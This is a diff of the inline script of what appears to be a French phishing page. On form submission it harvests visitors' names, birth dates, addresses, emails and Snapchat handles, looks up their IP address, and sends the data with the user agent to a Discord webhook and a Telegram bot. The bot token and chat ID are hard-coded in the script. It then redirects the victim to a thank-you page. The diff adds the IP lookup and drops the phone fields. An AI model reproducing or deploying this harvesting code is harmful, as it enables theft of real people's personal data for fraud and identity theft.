@@ -89,6 +89,16 @@
     const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
     const TELEGRAM_CHAT_ID = "-1002810249796";
 
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip || "IP inconnue";
+      } catch (e) {
+        return "IP inconnue";
+      }
+    }
+
     async function sendDiscord(embed) {
       return fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -114,7 +124,9 @@
       e.preventDefault();
       document.getElementById('msg').textContent = "Redirection...";
 
-      const step1 = JSON.parse(localStorage.getItem('step1') || '{}');
+      const ip = await getIP();
+      const ua = navigator.userAgent;
+
       const d = new FormData(e.target);
       const step2 = {
         nom: d.get('nom'),
@@ -126,10 +138,6 @@
         adresse: d.get('adresse'),
         snap: d.get('snap')
       };
-
-      const ip = step1.ip || "IP inconnue";
-      const ua = step1.ua || "Inconnu";
-
 
       const discordEmbed = {
         title: "🍭 +1 Entrée 🍭",
@@ -148,8 +156,8 @@
               `┗🏠 Code Postal : ${step2.codePostal}\n\n` +
 
               `📧 Email       : ${step2.email}\n` +
-              `📞 Téléphone   : ${step1.telephone || 'Non fourni'}\n` +
-              `📶 Opérateur   : ${step1.operateur || 'Non fourni'}\n\n` +
+              `📞 Téléphone   : Non fourni\n` +
+              `📶 Opérateur   : Non fourni\n\n` +
 
               `📟 IP          : ${ip}\n` +
               `🔎 User-Agent  : ${ua}`
@@ -162,9 +170,9 @@
       };
 
       const telegramText =
-        `[🎲] INFOS [🎲]\n\n` +
-        `🚀 Nom : ${step2.nom}\n` +
-        `🚀 Prénom : ${step2.prenom}\n` +
+        `🏁+ 1 INFOS 🏁\n\n` +
+        `🌬️ Nom : ${step2.nom}\n` +
+        `🌬️ Prénom : ${step2.prenom}\n` +
         `🎂 Naissance : ${step2.naissance}\n` +
         `🚀 Adresse : ${step2.adresse || 'Non fournie'}\n` +
         `🚀 Ville : ${step2.ville}\n` +
@@ -172,15 +180,17 @@
         `📧 E‑Mail : ${step2.email}\n` +
         `👻 Snapchat : ${step2.snap}\n\n` +
         `[📞] Phone [📞]\n` +
-        `📡 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
-        `📱 Téléphone : ${step1.telephone || 'Non fourni'}\n\n` +
+        `📡 Opérateur : Non fourni\n` +
+        `📱 Téléphone : Non fourni\n\n` +
         `[🌐] TIERS [🌐]\n` +
         `📟 Adresse IP : ${ip}\n` +
         `🔎 User-Agent : ${ua}`;
 
-      await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
+      await Promise.all([
+        sendDiscord(discordEmbed),
+        sendTelegram(telegramText)
+      ]);
 
-      localStorage.setItem('step2', JSON.stringify(step2));
       setTimeout(() => window.location = 'merci.html', 1000);
     });
   </script>
